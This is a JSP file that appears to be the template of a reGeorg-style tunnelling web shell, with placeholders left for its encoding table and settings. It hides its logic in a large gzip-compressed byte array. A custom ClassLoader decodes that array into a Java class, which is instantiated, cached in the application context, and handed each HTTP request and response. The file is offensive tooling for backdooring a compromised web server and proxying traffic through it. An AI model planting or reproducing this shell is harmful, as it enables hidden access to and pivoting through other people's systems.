<%@page pageEncoding="UTF-8"%>
<%!
    public static byte[] unGzip(byte[] bytes) throws Exception{
        java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
        java.io.ByteArrayInputStream in = new java.io.ByteArrayInputStream(bytes);
        java.util.zip.GZIPInputStream ungzip = new java.util.zip.GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0)
            out.write(buffer, 0, n);
        return out.toByteArray();
    }

    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }

        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
%>

<%
    Object[] args = new Object[]{
        request, //0
        response, //1
        "BASE64 CHARSLIST".toCharArray(), //2
        new byte[]{BASE64 ARRAYLIST},//3
        new Integer(HTTPCODE),//4
        new Integer(READBUF),//5
        new Integer(MAXREADSIZE),//6
        "Georg says, 'All seems fine'",//7
    };


    if(application.getAttribute("BASE64 CHARSLIST") == null){
        byte[] clazzBytes = unGzip(new byte[]{31,-117,8,0,-83,-86,-95,99,0,3,-99,57,13,120,83,-27,-43,-25,36,55,-71,55,-55,-91,77,83,46,-19,109,83,-88,-94,-104,-90,-83,69,-64,-88,41,63,-125,82,-96,-77,45,-40,32,21,-16,-121,52,-67,45,-111,-112,-44,36,69,-22,-108,57,-121,115,110,115,-22,-26,-26,64,5,-60,-97,-88,-61,-65,41,105,43,-126,-72,77,-36,-36,-1,-44,-31,-36,116,-18,-49,-23,126,-3,-66,111,-33,55,-65,63,-69,115,-18,-67,73,-109,54,60,-6,-116,7,-50,-5,-66,-25,61,-17,121,-49,123,-2,111,120,-23,-125,103,-114,1,-64,57,-8,87,39,-108,-61,113,17,-98,23,-31,-101,34,124,75,-124,123,28,-80,7,-66,45,-62,126,30,95,16,-31,-124,19,28,-16,-94,8,-33,113,-127,21,-66,-21,-126,-105,-32,123,46,16,-32,-5,34,-4,-128,49,63,-108,-32,71,60,-2,-40,9,63,-127,-97,50,120,89,-124,87,-100,-96,-64,113,6,-81,58,-63,5,63,-29,-39,73,39,-15,123,-115,-63,-49,69,120,-35,9,-65,-128,95,50,120,-125,-63,-101,-116,-2,21,-77,125,-117,121,-3,90,-124,-33,56,97,46,-4,-106,-63,-17,68,-8,-67,19,-26,-63,-37,12,-2,32,-62,59,78,120,23,-2,-24,-124,6,-8,-109,4,127,118,-62,95,-32,-81,34,-4,-115,-57,-9,24,-4,27,-17,-4,59,115,-7,15,39,-4,29,-2,-109,-63,127,-71,-32,31,-16,-66,11,-2,27,-2,-121,-63,-1,-14,-18,-1,-15,-107,-1,-49,60,63,96,48,65,75,4,6,72,18,-93,-59,-119,86,20,8,-112,124,4,72,-66,121,104,115,-95,29,69,23,74,-16,-66,-124,14,-90,114,74,-24,-30,29,-103,36,-57,25,60,43,99,80,-50,-64,-51,-72,10,17,61,78,-24,38,85,96,37,-50,-92,25,42,12,102,-15,-31,42,-46,43,86,51,-107,-54,-53,26,-98,-43,74,-24,-27,69,29,-17,-51,118,-62,32,-50,97,80,47,-30,105,78,-72,12,79,119,-30,92,60,-125,49,103,-70,112,30,-98,37,-95,79,-62,6,9,-3,18,54,50,-94,73,-60,102,34,-127,55,121,113,-74,-124,45,78,-100,-113,-25,48,-3,2,-98,45,116,-30,34,60,87,-62,0,47,-50,99,112,62,-125,11,-104,32,40,97,-85,-120,-117,-99,48,-52,118,27,-58,37,18,46,-27,113,-103,-124,31,99,-28,73,-106,123,57,-125,21,18,-74,-79,-116,43,25,-76,51,88,-59,96,53,-39,10,-41,56,-31,38,-20,112,-31,-57,-15,66,6,-99,34,118,49,-90,91,-60,-75,34,-82,115,-62,-51,120,17,-45,-10,-120,24,114,-62,45,-20,23,-73,-32,122,6,23,-77,-26,55,48,-24,101,112,-119,-120,27,-99,112,7,-117,114,7,110,98,-80,89,-60,75,69,-68,76,-60,-53,69,-68,2,-63,-94,-59,9,108,110,35,-48,-81,-15,108,5,-126,125,113,52,30,77,47,69,-80,-6,26,54,32,8,109,9,-34,-78,107,87,13,-121,99,41,4,-59,-41,121,101,120,71,-72,37,22,-114,15,-74,-84,-19,-69,82,-117,-92,91,27,54,33,-40,-6,2,-117,-104,-37,44,-33,-26,21,13,5,36,-95,116,50,26,31,108,53,8,-104,-45,44,-33,-12,-35,6,-66,-40,-79,85,11,-9,107,-55,109,-38,8,-62,-68,82,68,-91,-72,58,-37,119,70,-76,-95,116,52,17,39,-39,-60,104,42,-106,-120,-124,99,83,-92,-52,-99,39,41,-99,125,-79,29,87,-12,107,17,-3,77,85,44,-22,-26,-23,-49,49,-55,-76,120,-98,-84,-60,-109,117,-119,-109,-31,120,-1,-118,-111,-76,70,119,-37,125,29,29,58,-46,-39,-57,-120,-11,-119,-114,120,-102,30,-51,87,116,16,50,26,79,-81,79,-104,-92,54,-97,65,105,-33,-95,37,-93,3,-12,-38,-106,18,-46,-22,-104,-99,45,113,45,-35,-110,74,-59,90,66,-95,-50,-112,-106,74,-47,59,-11,119,120,34,91,-75,-56,-74,-74,88,84,35,-66,-55,-31,84,90,-21,71,8,-26,4,77,105,-111,-31,100,52,61,-46,18,-47,-110,-23,-106,75,-50,-99,127,65,27,77,-94,3,-47,72,56,-83,-75,-106,-48,-52,6,17,-73,-28,-104,-122,-76,36,-55,-107,103,-22,25,-44,-46,-53,35,-84,99,-83,-65,35,-107,26,-42,-110,-12,-126,-77,124,13,31,-23,42,25,14,-64,-67,8,-107,37,-107,124,-90,-15,-62,20,-35,23,-93,87,110,77,-89,-121,90,-42,16,8,25,-120,30,-14,56,45,69,58,-100,-9,97,116,-87,33,-78,-66,38,-61,-35,112,-113,12,-5,96,63,66,-59,-28,117,100,6,109,80,75,-54,24,-58,62,4,-9,-44,-73,-53,24,-63,126,17,53,25,7,-112,22,91,49,90,68,100,8,43,-29,-107,124,24,100,-36,-122,49,17,-73,-53,24,-57,62,25,19,112,-104,-68,99,42,-57,21,-61,-47,88,63,95,56,-124,87,-47,-5,-111,102,41,76,-53,-112,-127,-121,100,120,12,30,39,117,76,30,-55,123,-81,-120,-61,50,-18,-64,-85,101,-36,9,-9,-54,56,66,0,14,-63,-93,50,94,-61,-53,79,32,-23,65,-42,-113,-79,67,92,-36,-45,-55,-100,-119,-8,90,-68,14,-95,38,-65,-63,106,-95,-51,-74,68,60,78,98,19,91,25,119,49,-39,39,-15,122,-124,-6,98,-113,98,-38,84,17,-79,-120,-97,-110,-15,6,-72,95,-58,79,-29,110,-118,127,-14,57,17,111,-108,-15,51,120,-109,121,-55,-28,105,-35,63,-70,-62,-15,-80,-82,-37,-49,-30,-51,50,126,14,63,47,-29,23,-16,22,25,-65,-120,-73,-118,120,-101,-116,-73,-29,-105,100,-4,50,-34,33,-30,87,100,-4,42,-34,41,-30,-41,100,-36,-125,123,101,-68,11,-17,-106,-15,30,120,68,-122,-121,9,-32,62,-36,47,-29,1,-92,55,63,1,79,-54,-16,0,60,40,-29,65,-68,79,-60,-5,89,41,15,-56,-8,32,102,68,124,72,-58,-121,-15,17,17,-65,-114,80,70,82,-89,-55,-9,-101,59,-75,-8,96,122,-85,-116,-92,43,50,-5,122,10,-56,-44,-128,-106,108,110,-25,-40,-43,-51,-5,40,-13,127,-116,-7,63,-50,54,-37,-122,79,-56,-8,36,-125,111,-32,83,8,117,-70,-22,-94,-119,22,14,-51,-27,-55,100,120,100,-19,112,122,104,56,77,-90,-44,-62,-37,69,124,90,-58,-61,-104,101,33,-24,-107,-93,120,-97,-116,99,-52,37,-123,-29,50,62,-61,76,-113,-112,105,-15,89,118,114,-79,109,109,119,119,123,-37,122,25,-113,-30,49,25,-97,99,112,28,-97,-105,-15,-101,-8,-83,66,27,117,16,8,37,34,-37,40,-84,-6,-5,-109,20,-45,108,-54,111,-117,-8,-126,-116,39,-16,69,25,-65,-125,-33,21,-15,37,25,-65,-121,-33,-89,-116,-68,-10,66,74,-63,-85,-106,119,116,34,-44,-82,10,71,99,90,127,125,-60,52,88,124,-80,62,-99,-88,79,-121,-109,20,-95,-108,97,86,118,-124,-14,18,-4,0,127,-120,48,-57,-72,-110,30,23,-39,26,-90,35,-79,84,-117,113,111,-101,-79,-108,-15,71,120,53,113,-17,105,95,-66,82,-60,31,-53,-8,19,-4,41,57,53,-66,44,-29,43,-84,-5,87,101,-4,25,-98,-92,-121,-83,90,-37,-45,-69,-68,103,-91,-116,-81,-31,-49,101,124,29,79,-54,-8,11,54,-30,14,124,-103,-4,127,-35,-38,-48,-6,-6,-92,17,-84,52,-122,-5,-21,7,88,76,74,-12,-45,35,99,96,-64,8,-116,95,-46,-53,-106,44,-31,-39,27,8,-72,-124,53,-16,20,-13,35,-117,96,-77,-116,111,-30,-81,100,124,11,127,45,-29,111,88,-67,111,-79,-74,127,-53,-77,-33,-79,99,-3,94,-58,-73,-7,-6,63,-32,-35,8,106,94,-81,-35,90,-6,-22,68,114,27,-57,123,114,32,28,-95,-120,126,7,111,69,-104,89,-92,120,83,-27,84,32,-118,-48,-117,114,-90,-64,119,57,84,-17,-125,-5,17,-68,-45,92,-93,35,-98,-9,12,-42,19,103,0,-4,-93,12,79,-61,97,25,-66,1,79,-55,-112,-123,-47,92,-10,24,78,71,99,45,61,84,30,18,68,-5,39,-4,-77,-116,127,-63,36,-62,-23,31,-98,52,-55,-108,-35,90,34,-87,-83,38,48,-120,48,123,74,-44,38,82,-23,120,120,-69,-74,-127,75,71,84,75,78,35,96,110,-123,-63,73,-55,-70,-60,-99,5,-9,-27,83,16,-126,68,85,106,67,56,54,-84,-23,-59,-97,-53,22,-71,-106,89,118,72,118,95,67,-25,41,83,-79,81,-102,-14,-46,-100,-118,-126,98,84,103,-87,-17,-22,49,-68,-109,124,-73,126,26,-25,98,10,-30,-21,-96,99,-67,36,63,63,-88,-54,36,103,-29,-84,35,-57,50,55,-120,-54,61,104,-98,-119,-89,-115,-60,64,-103,-126,80,5,-122,67,56,-29,84,-105,21,80,-75,-26,-110,52,-35,80,116,-40,65,-56,104,44,-36,23,35,21,9,-20,-20,84,-59,-61,67,67,90,-100,38,-51,31,-87,103,49,-53,67,-85,-39,27,80,-121,37,-91,19,-58,22,57,-85,-81,100,-109,83,-106,-109,37,-89,1,-37,-43,60,57,69,-101,67,44,109,3,-79,-31,20,61,-34,22,-119,37,82,68,103,35,-25,-26,36,-63,90,-20,-46,-46,91,19,36,110,89,-126,-60,-98,76,-2,-108,-94,114,-105,-101,37,102,114,-113,53,-101,-54,87,-28,28,3,23,-95,86,38,-116,124,73,-38,-16,109,-30,-101,-53,39,-27,105,-117,-123,57,-46,-100,-47,84,71,60,-107,14,-57,35,36,72,37,-99,-103,-18,-62,115,125,83,-70,-99,-87,36,-6,-93,-86,-117,105,-88,58,-27,29,-56,-91,27,57,119,-55,-39,-89,52,68,-87,-45,-12,56,-127,59,94,-124,94,-77,127,-102,-92,-70,80,27,49,-61,-88,117,-22,86,97,-116,-75,78,-23,-123,66,60,-47,-116,-24,-41,69,103,-65,52,114,-17,-86,112,36,-99,72,-114,20,70,83,97,-117,87,72,-45,106,-88,107,42,-70,-124,-70,-90,-99,-28,59,-39,-15,-41,-24,29,117,55,105,-110,12,-95,-26,-20,-85,-25,-90,-10,-8,-16,118,45,25,54,-51,-85,76,110,-76,37,98,49,-61,-20,116,70,-120,69,-71,5,-53,105,116,-38,-55,66,-114,122,-114,-20,36,122,-30,39,38,53,106,34,-39,-11,42,11,-113,-22,-69,-70,112,-59,56,78,61,105,-26,-103,72,-14,7,66,33,-41,14,19,79,76,61,-45,-79,116,-45,-42,112,-86,91,119,2,74,89,-44,25,11,113,125,81,28,73,-7,-98,-45,-111,87,10,-79,-101,116,-23,117,73,10,-122,100,122,-124,59,-37,83,-76,-30,-45,98,-84,-100,88,21,54,11,-28,-96,5,121,-87,112,-121,-18,-107,-120,-40,-20,-2,5,-97,-34,-4,-49,44,69,73,-49,-95,-92,64,31,18,38,127,67,-44,85,81,45,-42,79,39,43,-118,20,-45,21,30,34,-58,51,-118,16,-108,-115,-24,-13,41,-60,-95,94,76,76,-88,98,98,-99,-58,109,124,-44,117,12,-58,-87,-34,-76,-123,-39,92,101,-59,-73,-110,-58,82,-109,26,99,-111,114,-19,118,-101,-7,109,52,-7,-28,-30,-4,-55,-116,-38,-109,-55,68,50,-97,58,-39,-105,-45,-31,-12,-80,-82,3,-3,-119,-123,-35,-8,8,125,110,-24,9,-106,-67,40,-110,24,34,91,-8,75,124,106,118,-108,64,-23,-68,92,-23,68,-66,80,-109,26,98,102,-6,87,-24,-90,82,41,-43,17,-18,-17,-49,61,75,32,36,93,-19,-46,-109,-92,-47,-92,16,65,36,-79,125,40,-100,-44,-42,39,78,-111,102,-87,60,74,68,-112,-46,-12,15,61,-127,-77,41,-121,102,46,-121,-98,-78,-19,-94,-53,-19,41,29,-63,-63,81,-112,114,13,-86,-42,-46,95,-56,29,-109,-55,117,-110,-106,-36,-59,108,6,-87,93,-15,77,-27,100,-10,52,-58,-47,10,34,28,-120,14,82,90,90,65,-97,-56,-37,-12,106,-29,-93,-108,93,74,90,-115,-29,-97,107,-36,-92,-60,94,35,-31,-108,46,-49,-12,105,66,-118,91,-98,38,73,-5,-122,-71,44,125,72,16,-27,62,-95,73,44,121,-80,-24,-32,-121,125,-10,-25,-29,-72,60,-87,109,79,-20,-48,10,-114,86,-26,31,-62,110,-112,-77,-94,20,-114,-15,47,2,76,80,-99,-9,-124,98,-94,86,-34,42,-71,-63,38,-74,-123,13,-121,42,-97,36,48,89,83,109,-43,-62,-55,66,27,-26,55,-119,-91,85,47,-118,-22,-28,-113,33,-45,46,21,6,98,81,10,88,-103,-14,87,-113,-74,61,76,37,-120,109,82,-21,107,43,-43,51,-104,103,-102,62,98,-117,97,-110,-37,82,67,49,46,108,-91,-20,81,-12,-61,-57,100,88,-92,-122,-5,82,102,51,50,-117,127,-47,40,69,68,-95,118,49,-11,60,73,35,99,-120,-125,70,73,-89,-108,70,-77,-87,93,120,-86,-88,-74,20,-108,14,82,41,-67,-68,-117,18,79,123,76,-37,78,13,27,81,-70,56,119,-101,75,-93,104,22,-12,-20,-52,-86,-52,-68,43,-33,-58,-101,-23,-110,12,37,-14,89,35,20,125,58,-62,-63,8,61,-25,-62,105,-80,7,-54,-63,2,123,-31,46,-126,22,-2,-95,0,-128,-58,125,-80,-97,-58,114,64,-2,-103,-126,-32,65,90,85,-48,72,-97,-6,96,-13,-113,2,62,9,-4,7,-7,-125,-64,-40,-74,-35,9,118,-88,-89,113,97,-29,113,-80,-48,-33,-82,38,-21,-126,-29,96,-19,110,18,104,16,-126,-126,-65,-55,70,19,27,-3,61,12,118,127,-109,-99,22,34,-3,61,12,82,-109,72,115,71,22,-100,1,91,-109,-108,-101,-38,-101,-36,-10,-36,92,108,114,51,-119,43,40,9,1,-121,45,-32,-76,7,92,98,64,-106,2,51,-36,-10,64,-103,91,12,-108,-69,-91,-128,-69,121,28,100,-124,113,-104,-127,16,-84,80,-123,113,40,-93,-119,-57,-19,60,10,-27,-63,74,99,-104,73,52,110,-6,-64,-38,15,125,-98,-118,-96,66,43,15,-47,-52,82,103,101,-95,50,80,-91,84,89,14,-128,61,3,-25,41,85,-49,74,-63,106,117,-106,90,-99,-123,-103,6,110,-18,17,80,54,-114,-62,44,85,-55,66,-43,17,112,109,84,-85,71,-127,-74,-85,-78,-96,6,-107,-52,-60,115,126,-34,-87,9,86,-87,85,99,80,27,-84,-52,64,117,80,81,61,-86,-108,-123,58,-43,-109,-123,-39,12,-26,88,15,-87,-107,74,-71,-2,18,69,85,78,88,80,63,85,-65,23,-33,103,60,-122,88,-22,-45,-88,93,30,-121,-45,89,-82,35,48,119,-93,-86,-116,-62,25,-52,54,11,103,30,-121,121,36,86,53,-117,123,-106,90,45,100,-63,-25,105,96,25,-3,123,-96,69,-83,62,14,13,-2,44,52,122,-102,-58,-96,57,-88,-86,42,10,71,-31,-20,-115,86,127,8,-77,-26,-74,-86,102,97,126,22,-50,33,-2,11,-120,63,-47,-116,-63,-62,96,-115,90,51,6,-117,-44,-102,113,56,-105,-112,-75,106,-19,56,4,-112,-36,-62,-57,-77,-13,16,88,90,111,-77,-22,29,-121,-13,45,16,-84,-93,-5,-67,99,112,-127,90,-105,-123,96,102,-30,-107,-68,70,-49,103,73,90,-125,-75,25,16,-125,94,-21,33,-65,90,57,6,-117,-77,-80,36,-24,85,-67,89,88,74,7,107,-43,58,-85,90,119,44,11,-53,-44,-38,44,124,-116,-63,114,62,-76,98,28,-38,-40,112,43,-117,-82,95,86,120,-67,-22,61,1,-115,-86,-41,-45,-98,-123,85,123,-31,52,-102,-83,-42,103,85,44,77,22,-42,16,119,65,-11,-86,117,-29,-48,97,-123,-52,-60,81,102,-5,-15,10,-68,-19,32,-52,-32,-23,-123,44,86,13,-49,58,-7,-122,23,-95,76,21,20,-37,56,116,89,-64,122,-88,66,0,50,119,-35,17,-24,38,3,-81,13,-50,102,57,-55,-18,27,3,94,122,-43,108,-59,75,-101,115,88,-14,57,86,-123,30,-66,78,-99,-83,-50,-55,-62,69,-103,-119,-41,117,55,-104,-99,-123,30,-14,4,34,17,60,-19,-68,19,26,-125,-11,-29,112,-79,21,72,34,-106,66,-65,-123,60,-127,-74,54,76,117,6,50,119,47,-91,-62,-100,44,-28,4,14,-35,57,-56,35,79,-32,73,90,58,-11,101,-107,58,-53,115,73,22,54,-18,-123,126,-62,-51,-48,113,-43,52,43,-29,-39,24,108,10,-112,29,55,-77,29,-77,112,-23,17,-72,-116,124,83,81,71,-31,-14,10,-41,88,22,-82,80,107,-84,89,-40,-46,-85,86,-88,85,108,-29,48,9,54,83,113,121,-6,66,25,-36,68,92,120,30,9,-47,32,123,-6,9,-75,-102,-82,-46,-12,-85,-4,124,98,28,6,44,100,-127,65,118,59,98,-98,-123,-83,25,-80,-111,-29,-24,91,81,11,100,-112,68,-11,92,-87,31,-72,-69,-8,-128,98,31,-125,109,68,90,-51,94,23,11,-44,40,98,-96,-42,26,-16,-26,-44,92,-89,-44,-20,-125,-112,82,67,-38,-99,-51,20,-37,-83,-22,108,-85,82,-61,10,-82,99,-91,94,-60,-56,120,-81,-30,85,106,-74,4,8,84,88,-16,94,112,-46,-78,-10,94,112,-109,-72,110,54,82,79,40,3,-27,-7,27,50,19,-113,-27,-98,6,50,-35,108,60,45,3,41,18,49,-95,-117,24,-99,-14,-90,74,-59,109,102,33,14,-122,99,44,48,105,-111,-39,13,-11,-78,54,-81,-46,97,114,15,-7,75,53,-49,82,-67,-103,-119,-9,-14,119,-44,-26,-17,-48,-43,-105,14,-27,116,-92,122,-4,-22,76,-61,-5,-117,44,-98,-127,-103,-45,82,66,6,-124,46,-21,33,112,-63,93,40,-96,8,94,-4,7,126,96,-95,-82,-62,122,-87,53,99,125,-124,-58,87,-83,111,88,-33,2,-81,96,23,110,16,110,-92,-15,97,-31,109,-31,93,-16,82,-18,-83,-75,-51,39,122,-81,69,-32,-47,98,-77,60,-90,-113,-113,91,125,60,90,27,108,-51,60,-22,73,-6,1,120,-48,72,-46,56,11,108,32,-47,-24,60,2,-61,100,-121,29,93,-115,-57,-106,90,3,-126,34,-44,29,-124,-65,55,42,-62,110,1,23,86,-64,-60,-82,-128,-115,80,7,-96,-79,-55,-1,52,-40,21,-101,-19,-38,69,89,-72,-70,-41,92,-39,119,-119,59,-115,-75,103,103,22,70,122,51,48,94,120,-44,-82,31,109,63,-27,81,-59,94,1,-17,-19,18,-81,-67,-66,96,-61,-18,46,-33,101,-53,49,-67,-58,96,-38,95,-56,84,-4,23,-40,41,98,5,28,-33,-27,-74,23,109,-119,-18,101,-69,-12,101,102,66,110,-54,-62,39,-98,48,11,89,6,30,50,117,-28,1,1,-100,52,-38,27,41,111,117,53,29,91,-54,62,91,55,10,-41,6,5,43,-23,-59,70,-86,122,-121,88,73,77,-118,109,-73,13,23,46,-92,7,51,-50,-95,-40,45,-5,39,-34,37,-88,87,-116,23,-118,72,68,-109,68,-44,73,68,-125,-28,32,69,-66,-99,-59,116,-49,103,-7,-77,112,-99,73,31,-112,20,-55,-67,-28,0,56,84,74,-14,61,79,48,39,69,98,-84,-63,68,34,38,-81,17,-44,-103,92,70,76,68,122,46,41,66,114,47,-34,101,43,-30,-29,80,28,83,-7,56,24,107,-16,113,-24,124,28,6,31,-123,-8,72,118,-46,-42,78,-59,-63,44,50,19,-43,-58,41,93,63,18,-1,26,77,125,1,-9,1,41,-46,-113,-99,-58,65,79,69,-89,-33,-77,43,11,-97,100,37,-27,-68,104,77,-109,34,44,8,-38,-52,122,73,42,-84,82,109,86,98,68,60,63,-91,47,104,126,-125,81,56,59,11,-120,-104,-113,-114,35,-117,103,38,-58,26,-83,-124,12,9,-3,116,-50,16,-32,-21,-12,79,32,3,-79,67,31,-126,71,77,81,-74,-127,21,68,26,-81,-32,82,-39,72,-107,50,11,-97,-18,26,-125,-35,-35,84,-106,110,-28,42,-78,-102,38,-97,-31,34,114,83,80,-32,-25,124,54,104,83,109,-26,-98,-113,103,-6,-26,-51,65,-69,106,127,30,62,-73,7,42,84,123,22,62,79,126,-15,-123,61,96,19,14,81,-127,-53,76,100,41,62,-117,69,112,-16,-1,86,-104,93,-47,-115,20,81,14,26,71,-12,22,-93,-45,-70,-60,127,108,-87,72,89,-115,52,112,-53,70,-22,-108,-66,24,-76,123,73,45,-101,-103,-15,-83,1,65,-75,-109,58,84,27,85,-63,-37,122,85,-37,24,-36,78,-82,-63,-28,18,109,72,86,85,-46,55,-68,-110,34,110,-39,-78,68,17,-36,-46,65,-88,86,-124,125,80,73,-79,-96,-41,27,-119,-118,13,-27,30,7,-83,85,41,-108,-103,120,-80,-47,-48,-113,-125,-1,127,-64,20,-23,6,-45,64,113,-65,85,114,83,34,-6,82,-56,-17,118,-104,51,51,-1,-110,-100,94,-1,-79,-125,-48,-31,-9,46,56,1,75,8,118,55,63,15,46,106,6,-101,-87,-90,112,-67,22,40,-119,54,-101,-55,81,104,-92,34,123,93,-93,42,80,-118,-4,50,-27,-26,70,86,-27,69,92,10,108,-69,45,100,-82,-47,70,-35,81,16,-70,-31,114,8,-21,54,114,-16,-17,-66,-90,60,103,-109,-107,108,52,-98,126,4,-18,-96,-53,-65,-46,-43,84,91,-45,47,108,-55,-62,87,107,-74,44,-83,-93,-57,11,77,-52,-16,78,85,-56,-67,-27,105,56,108,-98,61,-113,-50,90,104,108,-12,-37,-11,68,-32,-73,-23,-125,91,-38,121,-67,95,48,-90,110,-102,90,-115,105,-11,-50,-21,23,-41,30,50,-103,100,97,-44,100,-78,-116,20,-62,76,22,-110,-90,59,27,-19,53,76,123,-5,-6,70,91,-115,91,-70,-58,-100,11,53,110,119,110,110,-83,113,87,-25,-26,-71,-12,48,70,13,-118,-63,-84,-116,70,43,-115,22,-31,-112,-71,-9,12,28,49,-3,113,6,-3,-29,61,-77,61,-50,121,-52,-77,-12,-17,-24,71,33,58,6,-49,77,109,-74,-83,71,-31,107,-122,16,-16,79,-37,-67,-88,52,83,33,0,0});
        Class clazz = new U(this.getClass().getClassLoader()).g(clazzBytes);
        application.setAttribute("BASE64 CHARSLIST",clazz.newInstance());
    }
    application.getAttribute("BASE64 CHARSLIST").equals(args);
%>
